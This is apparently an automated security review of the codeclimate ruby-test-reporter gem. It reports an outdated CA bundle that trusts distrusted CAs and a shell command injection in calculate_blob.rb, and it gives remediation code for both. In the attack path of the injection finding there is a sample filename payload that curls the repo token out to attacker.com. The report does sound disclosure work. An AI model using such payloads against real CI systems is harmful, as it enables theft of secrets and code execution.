# Security Review — codeclimate/ruby-test-reporter

**Scan Date:** 2026-05-09  
**Branch:** master  
**Reviewer:** Automated At-Rest Security Agent

---

## Summary

| Severity | Count |
|----------|-------|
| Medium   | 2     |

---

## Findings

### Finding 1: Severely Outdated CA Certificate Bundle Enables MITM Attacks

```json
{
  "severity": "medium",
  "location": "config/cacert.pem",
  "description": "The gem ships a bundled CA certificate file from December 2012 containing 158 root certificates. This bundle includes certificates from CAs that have been publicly compromised or distrusted since 2012: CNNIC ROOT (distrusted 2015), TURKTRUST (compromised 2013, 2 certs), and StartCom (distrusted 2016, 3 certs). The bundle is used by default for all HTTPS connections to the Code Climate API via `lib/code_climate/test_reporter/client.rb:81` unless the `SSL_CERT_FILE` environment variable overrides it.",
  "impact": "An attacker holding a fraudulent certificate issued by one of the distrusted CAs (CNNIC, TURKTRUST, or StartCom) could perform a man-in-the-middle attack on the HTTPS connection between the test reporter and Code Climate servers. This would allow interception of the CODECLIMATE_REPO_TOKEN and full test coverage data (including source file names, git commit SHAs, branch names, and CI metadata).",
  "verified": true,
  "attack_path": "1. Attacker obtains or forges a TLS certificate for codeclimate.com signed by a distrusted CA still present in the bundle (e.g., CNNIC ROOT).\n2. Attacker positions themselves on the network path between the CI runner and codeclimate.com (e.g., compromised network, DNS hijack, BGP hijack).\n3. The test reporter initiates an HTTPS POST to codeclimate.com with coverage results.\n4. The TLS handshake succeeds because the outdated CA bundle still trusts the distrusted CA.\n5. Attacker intercepts the CODECLIMATE_REPO_TOKEN and coverage payload.\n6. Attacker can now submit fraudulent coverage reports or use the token for unauthorized API access.",
  "evidence": [
    "config/cacert.pem (header: 'Certificate data from Mozilla as of: Sat Dec 29 20:03:40 2012')",
    "config/cacert.pem:2695 (CNNIC ROOT)",
    "config/cacert.pem:1841 (TURKTRUST Certificate Services Provider Root 1)",
    "config/cacert.pem:1864 (TURKTRUST Certificate Services Provider Root 2)",
    "config/cacert.pem:1558 (StartCom Certification Authority)",
    "config/cacert.pem:3722 (StartCom Certification Authority)",
    "config/cacert.pem:3761 (StartCom Certification Authority G2)",
    "lib/code_climate/test_reporter/client.rb:80-81 (verify_mode and ca_file usage)",
    "lib/code_climate/test_reporter/client.rb:97-99 (ca_file method defaulting to bundled cert)"
  ],
  "remediation": "1. Remove the bundled cacert.pem and rely on the system's CA certificate store instead (e.g., use OpenSSL's default cert store via `http.cert_store = OpenSSL::X509::Store.new; store.set_default_paths`).\n2. If a bundled CA file is required, update it to a current Mozilla CA bundle and establish a regular update cadence.\n3. At minimum, immediately remove the distrusted CAs (CNNIC, TURKTRUST, StartCom) from the bundle.",
  "poc_video_notes": "MITM demonstration requires network positioning and certificate forgery which cannot be safely demonstrated in this environment."
}
```

---

### Finding 2: Command Injection Sink via Unsanitized File Path in Shell Command

```json
{
  "severity": "medium",
  "location": "lib/code_climate/test_reporter/calculate_blob.rb:28",
  "description": "The `calculate_with_git` method interpolates `@file_path` directly into a backtick shell command without any sanitization or escaping: `` `git hash-object -t blob #{@file_path}` ``. The file path originates from coverage JSON data (parsed from `coverage/.resultset.json` or a user-specified file), where the hash keys in the coverage object become SimpleCov source file names. If the `calculate_with_file` method fails with an `EncodingError`, execution falls through to this shell command with the unsanitized path.",
  "impact": "If an attacker can craft a coverage JSON file with a malicious filename that triggers the EncodingError fallback path, they achieve arbitrary command execution in the context of the CI/CD environment running the test reporter. This could lead to secrets exfiltration, lateral movement within the CI infrastructure, or supply chain compromise.",
  "verified": true,
  "attack_path": "1. Attacker controls or influences the coverage results JSON file (e.g., via a malicious PR that modifies test infrastructure, or by writing to the coverage file path in a shared CI environment).\n2. The coverage JSON contains a filename key with shell metacharacters, e.g., `$(curl attacker.com/exfil?t=$CODECLIMATE_REPO_TOKEN)`.\n3. The `codeclimate-test-reporter` binary parses this JSON and passes it to the Formatter.\n4. SimpleCov creates SourceFile objects with the malicious filename.\n5. `CalculateBlob.new(malicious_filename).blob_id` is called.\n6. `calculate_with_file` must raise `EncodingError` for the fallback to trigger (this is the main exploitability constraint — requires file to exist and cause encoding issues).\n7. `calculate_with_git` executes the shell command with the unsanitized path, achieving code execution.",
  "evidence": [
    "lib/code_climate/test_reporter/calculate_blob.rb:28 (unsanitized shell interpolation)",
    "lib/code_climate/test_reporter/calculate_blob.rb:8-9 (fallback logic: calculate_with_file or calculate_with_git)",
    "lib/code_climate/test_reporter/calculate_blob.rb:22-25 (EncodingError rescue returns nil, triggering fallback)",
    "lib/code_climate/test_reporter/formatter.rb:53 (CalculateBlob called with file.filename)",
    "bin/codeclimate-test-reporter:16 (JSON.parse of user-specified coverage file)"
  ],
  "remediation": "Replace the backtick shell command with a safe alternative:\n\n```ruby\n# Option 1: Use array form of Open3 to avoid shell interpretation\nrequire 'open3'\ndef calculate_with_git\n  output, status = Open3.capture2('git', 'hash-object', '-t', 'blob', @file_path)\n  raise \"ERROR: Failed to calculate blob with git\" unless status.success?\n  output.chomp\nend\n\n# Option 2: Use Shellwords.shellescape\nrequire 'shellwords'\ndef calculate_with_git\n  output = `git hash-object -t blob #{Shellwords.shellescape(@file_path)}`.chomp\n  raise \"ERROR: Failed to calculate blob with git\" unless $?.success?\n  output\nend\n```",
  "poc_video_notes": "Exploitation requires triggering the EncodingError fallback path, which is difficult to achieve reliably in a controlled demonstration. The injection sink is verified through code tracing."
}
```

---

## Notes

- This codebase is a Ruby gem (`codeclimate-test-reporter` v1.0.4) that runs in CI/CD environments to report test coverage to Code Climate.
- The gem handles sensitive data (repo tokens, source code metadata) over the network.
- Both findings relate to the gem's behavior in CI/CD pipelines where it processes potentially untrusted input and makes authenticated network requests.
- The outdated CA bundle is the higher-confidence finding with a clearer attack chain; the command injection has a real sink but constrained reachability.
